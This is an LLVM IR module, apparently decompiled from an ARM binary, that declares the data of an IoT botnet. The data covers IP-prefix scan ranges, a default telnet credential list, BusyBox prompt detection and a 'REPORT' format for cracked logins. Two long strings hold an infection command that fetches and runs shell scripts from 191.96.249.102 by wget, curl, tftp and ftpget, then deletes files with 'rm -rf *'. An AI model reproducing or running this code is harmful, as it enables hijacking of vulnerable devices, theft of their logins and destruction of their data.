source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.4 = constant i32 -352321502
@global_var_2b080.8 = global i32 0
@global_var_2b090.9 = global i32* @global_var_2b080.8
@global_var_2b5b8.16 = global i32 0
@global_var_2b084.19 = global i32 0
@global_var_13108.23 = constant i32 -509558771
@global_var_2b5e8.26 = global i32 0
@global_var_2b5ec.27 = local_unnamed_addr global i32 0
@global_var_2b5f0.28 = local_unnamed_addr global i32 0
@global_var_2b1d4.31 = local_unnamed_addr global i32 4095
@global_var_2b1d0.34 = global i32 362436
@global_var_1ce04.36 = constant [7 x i8] c"(null)\00"
@global_var_2f5e8.38 = local_unnamed_addr global i32 0
@global_var_1ce0c.40 = constant [8 x i8] c"/bin/sh\00"
@global_var_1ce14.42 = constant [3 x i8] c"sh\00"
@global_var_1ce18.44 = constant [3 x i8] c"-c\00"
@global_var_1ce1c.47 = constant i32 -1
@global_var_1d21c.49 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1d22c.51 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_2b5d0.55 = global i32 0
@global_var_1d238.57 = constant [5 x i8] c"PING\00"
@global_var_1d240.59 = constant [14 x i8] c"gethostbyname\00"
@global_var_2b5d4.61 = global i32 0
@global_var_2b5d8.62 = local_unnamed_addr global i32 0
@global_var_31854.64 = global i32 0
@global_var_1d250.66 = constant [6 x i8] c":>%$#\00"
@global_var_1d258.74 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_1d264.76 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_1d274.78 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_1d280.80 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1d290.82 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1d29c.84 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_1d2ac.86 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1d2b8.88 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1d2c8.90 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_1d2d8.92 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_1d2e8.94 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_1d2f8.96 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1d304.98 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_1d314.100 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_1d324.102 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_1d334.104 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_1d344.106 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_1d354.108 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1d364.110 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1d374.112 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1d380.114 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1d38c.116 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_1d39c.118 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_1d3a8.120 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_1d3b4.122 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_1d3c0.124 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_1d3cc.126 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_1d3d8.128 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_1d3e8.130 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_1d3f8.132 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1d404.134 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1d414.136 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1d420.138 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1d42c.140 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1d438.142 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1d444.144 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1d450.146 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1d45c.148 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1d468.150 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1d478.152 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1d488.154 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_1d498.156 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_1d4a8.158 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_1d4b8.160 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_1d4c8.162 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_1d4d8.164 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_1d4e8.166 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_1d4f8.168 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_1d508.170 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_1d518.172 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_1d528.174 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_1d538.176 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_1d548.178 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_1d558.180 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_1d568.182 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_1d578.184 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1d588.186 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_1d598.188 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_1d5a8.190 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_1d5b8.192 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_1d5c8.194 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_1d5d8.196 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_1d5e8.198 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_1d5f8.200 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_1d608.202 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_1d618.204 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_1d628.206 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_1d638.208 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_1d648.210 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_1d658.212 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_1d668.214 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_1d678.216 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_1d688.218 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_1d698.221 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_1d6a8.223 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_1d6b8.225 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_1d6c8.227 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_1d6d8.229 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_1d6e8.231 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_1d6f8.233 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_1d708.235 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_1d718.237 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_1d728.239 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_1d738.241 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_1d748.243 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_1d758.245 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_1d768.247 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_1d778.249 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_1d788.251 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1d798.253 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1d7a8.255 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1d7b8.257 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1d7c8.259 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1d7d8.261 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_1d7e8.263 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_1d7f8.265 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_1d808.267 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_1d818.269 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_1d828.271 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_1d834.273 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_1d844.275 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_1d854.277 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_1d864.279 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1d870.281 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_1d880.283 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_1d890.285 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_1d8a0.287 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1d8b0.289 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_1d8c0.291 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_1d8d0.293 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_1d8e0.295 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_1d8f0.297 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_1d900.299 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_1d910.301 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_1d920.303 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_1d930.305 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_1d940.307 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_1d950.309 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_1d960.311 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_1d96c.313 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_1d97c.315 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_1d98c.317 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_1d99c.319 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_1d9ac.321 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_1d9bc.323 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_1d9cc.325 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_1d9dc.327 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_1d9ec.329 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_1d9fc.331 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_1da0c.333 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_1da1c.335 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_1da2c.337 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_1da3c.339 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_1da4c.341 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_1da5c.343 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_1da6c.345 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_1da7c.347 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_1da8c.349 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_1da9c.351 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_1daac.353 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_1dabc.355 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_1dacc.357 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_1dadc.359 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_1daec.361 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_1dafc.363 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_1db0c.366 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_1db1c.368 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_1db2c.370 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_1db3c.372 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_1db4c.374 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_1db5c.376 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_1db68.378 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_1db78.380 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_1db88.382 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_1db98.384 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_1dba8.386 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_1dbb8.389 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_1dbc8.391 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_1dbd8.393 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_1dbe8.395 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_1dbf8.397 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_1dc08.399 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_1dc18.401 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_1dc28.403 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_1dc38.405 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_1dc48.407 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_1dc58.409 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_1dc68.411 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_1dc78.413 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_1dc88.415 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_1dc98.417 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_1dca8.419 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_1dcb8.422 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_1dcc8.424 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_1dcd8.426 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_1dce8.428 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_1dcf8.430 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_1dd08.432 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_1dd18.434 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_1dd28.436 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_1dd38.438 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_1dd48.440 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_1dd58.442 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_1dd68.444 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_1dd78.446 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_1dd88.448 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_1dd98.450 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_1dda8.452 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_1ddb8.454 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_1ddc8.456 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_1ddd8.458 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_1dde8.460 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_1ddf8.462 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_1de08.464 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_1de18.466 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_1de28.468 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_1de38.470 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_2b1d8.474 = global i32 110
@global_var_1de58.477 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_31848.479 = global i32 0
@global_var_10000.480 = constant i32 -369098744
@global_var_1cdf0.482 = constant [8 x i8] c"BusyBox\00"
@global_var_1cdf8.483 = constant i32 36
@global_var_1cdfc.484 = constant i32 35
@global_var_1ce00.485 = constant [3 x i8] c"~#\00"
@global_var_2b188.486 = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1cdf0.482, i32 0, i32 0), i8* bitcast (i32* @global_var_1cdf8.483 to i8*), i8* bitcast (i32* @global_var_1cdfc.484 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ce00.485, i32 0, i32 0)]
@global_var_1cdb8.488 = constant [7 x i8] c"nvalid\00"
@global_var_1cdc0.489 = constant [6 x i8] c"ailed\00"
@global_var_1cdc8.490 = constant [9 x i8] c"ncorrect\00"
@global_var_1cdd4.491 = constant [6 x i8] c"enied\00"
@global_var_1cddc.492 = constant [5 x i8] c"rror\00"
@global_var_1cde4.493 = constant [7 x i8] c"oodbye\00"
@global_var_1cdec.494 = constant [4 x i8] c"bad\00"
@global_var_2b168.495 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1cdb8.488, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1cdc0.489, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1cdc8.490, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1cdd4.491, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1cddc.492, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1cde4.493, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cdec.494, i32 0, i32 0)]
@global_var_2b154 = external global i32
@global_var_1ca30.502 = constant [7 x i8] c"666666\00"
@global_var_1ca38.503 = constant [8 x i8] c"support\00"
@global_var_1ca44.504 = constant [8 x i8] c"default\00"
@global_var_1ca50.505 = constant [5 x i8] c"root\00"
@global_var_1ca58.506 = constant [6 x i8] c"admin\00"
@global_var_1ca60.507 = constant [11 x i8] c"supervisor\00"
@global_var_1ca6c.508 = constant [5 x i8] c"ubnt\00"
@global_var_1ca74.509 = constant i32 0
@global_var_1ca78.510 = constant [5 x i8] c"1234\00"
@global_var_1ca80.511 = constant [7 x i8] c"123456\00"
@global_var_1ca88.512 = constant [5 x i8] c"vnpt\00"
@global_var_1ca90.513 = constant [11 x i8] c"1234567890\00"
@global_var_1ca9c.514 = constant [7 x i8] c"antslq\00"
@global_var_1caa4.515 = constant [9 x i8] c"zyad1234\00"
@global_var_1cab0.516 = constant [5 x i8] c"anko\00"
@global_var_1cab8.517 = constant [5 x i8] c"tini\00"
@global_var_1cac0.518 = constant [8 x i8] c"letacla\00"
@global_var_1cacc.519 = constant [4 x i8] c"5up\00"
@global_var_1cad4.520 = constant [7 x i8] c"xc3511\00"
@global_var_1cadc.521 = constant [703 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_2b0a0.522 = global [45 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ca30.502, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ca38.503, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ca44.504, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ca58.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ca58.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ca58.506, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ca58.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ca38.503, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ca60.507, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ca60.507, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca6c.508, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ca30.502, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ca38.503, i32 0, i32 0), i8* bitcast (i32* @global_var_1ca74.509 to i8*), i8* bitcast (i32* @global_var_1ca74.509 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ca58.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca78.510, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ca80.511, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca78.510, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca88.512, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ca90.513, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ca38.503, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ca9c.514, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1caa4.515, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1cab0.516, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1cab8.517, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1cac0.518, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ca60.507, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca6c.508, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cacc.519, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1cad4.520, i32 0, i32 0), i8* getelementptr inbounds ([703 x i8], [703 x i8]* @global_var_1cadc.521, i32 0, i32 0)]
@global_var_1de64.524 = constant [3 x i8] c"\0D\0A\00"
@global_var_2b0f8.526 = global [23 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ca30.502, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ca38.503, i32 0, i32 0), i8* bitcast (i32* @global_var_1ca74.509 to i8*), i8* bitcast (i32* @global_var_1ca74.509 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ca58.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca78.510, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca50.505, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ca80.511, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca78.510, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca88.512, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ca90.513, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ca38.503, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ca9c.514, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1caa4.515, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1cab0.516, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1cab8.517, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1cac0.518, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ca60.507, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ca6c.508, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cacc.519, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1cad4.520, i32 0, i32 0), i8* getelementptr inbounds ([703 x i8], [703 x i8]* @global_var_1cadc.521, i32 0, i32 0)]
@global_var_2b19c.528 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1cdb8.488, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1cdc0.489, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1cdc8.490, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1cdd4.491, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1cddc.492, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1cde4.493, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cdec.494, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1cdf0.482, i32 0, i32 0), i8* bitcast (i32* @global_var_1cdf8.483 to i8*), i8* bitcast (i32* @global_var_1cdfc.484 to i8*)]
@global_var_1de68.531 = constant i32 993024795
@global_var_1ded4.533 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_2b150.535 = local_unnamed_addr global [703 x i8]* @global_var_1cadc.521
@global_var_1dee4.537 = constant [711 x i8] c"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A x00\00"
@global_var_1e1ac.539 = constant [3 x i8] c"AA\00"
